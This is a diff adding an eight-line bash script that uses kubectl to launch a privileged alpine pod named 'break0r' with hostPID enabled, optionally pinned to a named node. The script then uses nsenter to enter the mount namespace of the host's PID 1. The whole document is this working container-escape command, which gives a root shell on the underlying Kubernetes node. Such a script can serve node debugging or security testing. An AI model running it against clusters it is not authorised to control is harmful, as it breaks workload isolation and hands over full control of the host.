@@ -1,0 +1,8 @@
+#!/usr/bin/env bash
+
+KCMD="kubectl run break0r --rm -it --image alpine --privileged"
+CMD="nsenter -m/proc/1/ns/mnt"
+
+[ -z "$1" ] && ${KCMD} --overrides "{\"spec\":{\"hostPID\":true}}" -- ${CMD}
+ 
+${KCMD} --overrides "{\"spec\":{\"hostPID\":true, \"nodeName\": \"$1\"}}" -- ${CMD}
